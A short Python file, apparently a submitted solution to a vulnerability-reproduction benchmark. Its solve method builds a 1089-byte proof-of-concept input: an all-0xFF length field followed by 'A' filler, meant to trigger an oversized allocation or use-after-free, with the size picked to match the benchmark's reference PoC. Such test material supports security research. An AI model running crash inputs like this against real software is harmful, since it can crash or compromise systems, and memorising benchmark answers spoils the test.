import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Use a very large length field to trigger oversized allocation / UAF.
        # Support both 32-bit and 64-bit readers by setting all 8 bytes to 0xFF.
        length_field = b'\xff' * 8

        # Fill the rest with arbitrary data (doesn't need to match the length).
        # Choose total size close to the ground-truth PoC length (1089 bytes).
        total_length = 1089
        filler_length = max(0, total_length - len(length_field))
        filler = b'A' * filler_length

        return length_field + filler
